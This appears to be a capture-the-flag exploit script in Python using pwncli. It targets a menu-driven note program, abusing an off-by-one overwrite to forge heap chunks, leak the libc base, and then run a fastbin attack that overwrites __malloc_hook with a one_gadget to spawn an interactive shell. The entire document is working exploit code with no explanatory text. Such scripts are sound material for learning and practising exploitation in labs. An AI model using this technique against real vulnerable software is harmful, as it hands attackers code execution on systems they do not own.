#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def add(size:int):
    p.sendlineafter("6.exit\n", "1")
    p.sendlineafter("Input the size\n", str(size))

def delete():
    p.sendlineafter("6.exit\n", "2")

def show():
    p.sendlineafter("6.exit\n", "3")
    return p.recvline()

def update_name(name):
    p.sendlineafter("6.exit\n", "4")
    p.send(name)


def edit_note(data):
    p.sendlineafter("6.exit\n", "5")
    p.sendafter("Input the note", data)


p.sendafter("Please input your name\n", "lynne")

add(0x1f0)
update_name("\x00" * 0x31)

edit_note(flat({0:[0, 0x101], 0x100:[0, 0x101]}))
update_name("\x10" * 0x31)

delete()

add(0x60)
update_name("\x80" * 0x31)
msg = show()
info("msg recv: {}".format(msg))
libc_base_addr = u64(msg[:-1] + b"\x00\x00") - 0x3c4b78
libc.address = libc_base_addr
log_address("libc_base_addr", libc_base_addr)

update_name("\x10" * 0x31)
delete()

add(0x10)
update_name("\x10" * 0x31)
edit_note(p64(libc.sym['__malloc_hook'] - 0x23))

add(0x60)
payload = flat(["\x00" * 0xb, libc_base_addr + 0x4526a, libc.sym['realloc']+13], filler="\x00")
add(0x60)
edit_note(payload)

add(0x10)

p.interactive()